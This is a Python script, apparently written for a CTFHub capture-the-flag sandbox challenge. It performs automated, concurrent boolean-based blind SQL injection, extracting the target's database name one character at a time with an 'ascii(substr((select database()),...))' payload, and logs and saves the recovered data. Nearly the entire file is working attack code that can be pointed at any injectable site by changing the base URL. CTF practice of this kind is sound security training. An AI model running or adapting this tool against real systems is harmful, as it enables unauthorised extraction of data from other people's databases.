import asyncio
import aiohttp
import time
import logging
from typing import List, Dict, Optional
from dataclasses import dataclass
import json
from pathlib import Path

# 配置日志
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('sql_injection.log'),
        logging.StreamHandler()
    ]
)

@dataclass
class InjectionConfig:
    base_url: str
    start_pos: int = 1
    end_pos: int = 10
    ascii_start: int = 31
    ascii_end: int = 127
    batch_size: int = 50
    timeout: int = 10
    retry_count: int = 3
    delay: float = 0.1

class AsyncSQLInjection:
    def __init__(self, config: InjectionConfig):
        self.config = config
        self.results: Dict[int, str] = {}
        self.session: Optional[aiohttp.ClientSession] = None
        self.start_time = 0
        self.total_requests = 0
        self.successful_requests = 0

    async def create_session(self):
        """创建aiohttp会话"""
        timeout = aiohttp.ClientTimeout(total=self.config.timeout)
        self.session = aiohttp.ClientSession(timeout=timeout)

    async def close_session(self):
        """关闭aiohttp会话"""
        if self.session:
            await self.session.close()

    async def make_request(self, position: int, ascii_val: int) -> Dict:
        """发送单个异步请求"""
        payload = f'ascii(substr((select database()),{position},1))={ascii_val}'
        full_url = f"{self.config.base_url}{payload}"
        
        for attempt in range(self.config.retry_count):
            try:
                async with self.session.get(full_url) as response:
                    text = await response.text()
                    self.total_requests += 1
                    
                    if 'query_success' in text:
                        self.successful_requests += 1
                        return {
                            'success': True,
                            'position': position,
                            'ascii_val': ascii_val,
                            'char': chr(ascii_val)
                        }
                    return {'success': False}
            except Exception as e:
                if attempt == self.config.retry_count - 1:
                    logging.error(f"请求失败 {full_url}: {str(e)}")
                await asyncio.sleep(self.config.delay)
        
        return {'success': False}

    async def process_batch(self, tasks: List[asyncio.Task]) -> None:
        """处理一批请求"""
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for result in results:
            if isinstance(result, dict) and result.get('success'):
                pos = result['position']
                char = result['char']
                self.results[pos] = char
                current_result = ''.join(self.results[i] for i in sorted(self.results.keys()))
                logging.info(f"找到字符: {char} (位置: {pos})")
                logging.info(f"当前结果: {current_result}")

    async def run(self):
        """运行SQL注入测试"""
        self.start_time = time.time()
        await self.create_session()
        
        try:
            for pos in range(self.config.start_pos, self.config.end_pos + 1):
                tasks = []
                for ascii_val in range(self.config.ascii_start, self.config.ascii_end + 1):
                    task = asyncio.create_task(self.make_request(pos, ascii_val))
                    tasks.append(task)
                    
                    if len(tasks) >= self.config.batch_size:
                        await self.process_batch(tasks)
                        tasks = []
                        await asyncio.sleep(self.config.delay)  # 添加延迟避免请求过快
                
                if tasks:
                    await self.process_batch(tasks)
                
                # 如果当前位置没有找到字符，可能已经到达字符串末尾
                if pos not in self.results:
                    break
        finally:
            await self.close_session()

    def save_results(self):
        """保存结果到文件"""
        result = ''.join(self.results[i] for i in sorted(self.results.keys()))
        end_time = time.time()
        
        output = {
            'database_name': result,
            'execution_time': f"{end_time - self.start_time:.2f}秒",
            'total_requests': self.total_requests,
            'successful_requests': self.successful_requests,
            'success_rate': f"{(self.successful_requests/self.total_requests*100):.2f}%"
        }
        
        # 保存到JSON文件
        with open('injection_results.json', 'w', encoding='utf-8') as f:
            json.dump(output, f, ensure_ascii=False, indent=2)
        
        # 保存到文本文件
        with open('injection_results.txt', 'w', encoding='utf-8') as f:
            f.write(f"数据库名: {result}\n")
            f.write(f"执行时间: {end_time - self.start_time:.2f}秒\n")
            f.write(f"总请求数: {self.total_requests}\n")
            f.write(f"成功请求数: {self.successful_requests}\n")
            f.write(f"成功率: {(self.successful_requests/self.total_requests*100):.2f}%\n")

async def main():
    config = InjectionConfig(
        base_url='http://challenge-aca2fb9060468e2f.sandbox.ctfhub.com:10800/?id=1 and ',
        start_pos=1,
        end_pos=10,  # 可以根据需要调整
        batch_size=50,
        timeout=10,
        retry_count=3,
        delay=0.1
    )
    
    injector = AsyncSQLInjection(config)
    await injector.run()
    injector.save_results()

if __name__ == "__main__":
    asyncio.run(main()) 